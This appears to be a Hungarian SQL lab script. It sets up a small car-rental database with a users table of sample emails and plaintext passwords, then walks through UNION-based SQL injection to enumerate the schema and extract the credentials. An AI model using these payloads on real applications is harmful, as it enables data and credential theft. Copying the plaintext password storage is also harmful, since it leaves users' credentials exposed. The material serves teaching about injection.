# Adatb�zis l�trehoz�s

CREATE DATABASE cars
	CHARACTER SET utf8
	COLLATE utf8_hungarian_ci;

# T�bl�k
CREATE TABLE cars.cars (
  id INT(11) NOT NULL AUTO_INCREMENT,
  name VARCHAR(255) NOT NULL,
  licenceNumber VARCHAR(255) DEFAULT NULL,
  hourlyRate INT(11) DEFAULT NULL,
  PRIMARY KEY (id)
)
ENGINE = INNODB;

CREATE TABLE cars.users (
  id INT(11) NOT NULL AUTO_INCREMENT,
  email VARCHAR(50) DEFAULT NULL,
  password VARCHAR(255) DEFAULT NULL,
  PRIMARY KEY (id)
)
ENGINE = INNODB,
CHARACTER SET utf8,
COLLATE utf8_hungarian_ci;



# Adatbevitel
INSERT cars 
  (name, licenceNumber, hourlyRate)
  VALUES
  ('Mercedes', 'MM-111', 2000), ('Fiat', 'FF-111', 2100), ('BMW', 'BB-111', 2200);

INSERT users 
  (email, password)
  VALUES
  ('jozsi@gmail.com','jozsijelszo'),('bela@gmail.com','belajelszo'),('feri@gmail.com','ferijelszo');

# Lek�rdez�sek
# get http://localhost:3000/cars
SELECT * FROM cars;
SELECT * FROM users;

# get http://localhost:3000/cars/1
SELECT * FROM cars
  WHERE id = 1;

# sql injection
# union
SELECT * FROM cars union SELECT * FROM cars;
SELECT * FROM cars UNION ALL SELECT * FROM cars;
SELECT * FROM cars union SELECT *, '' FROM users;

# Mi az adatb�zis neve
SELECT * FROM cars
  WHERE id = 1 UNION SELECT database(), '', '', '';

# Milyen t�bl�k vannak
SELECT * FROM cars
  WHERE id = 1 union select table_name, '','', '' from information_schema.tables where table_schema='cars';

# cars t�bla oszlopai
SELECT * FROM cars
  WHERE id = 1 union select column_name, '', '', data_type from information_schema.columns where table_name='users' and table_schema='cars';

# user adatok kilop�sa
SELECT * FROM cars
  WHERE id = 1 union select email, password, '','' from users;

## Adatmanipul�ci�k
DELETE FROM cars
  WHERE id = 3;

INSERT cars 
  (name, licenceNumber, hourlyRate)
  VALUES
  ('BMW', 'BB-111', 2200);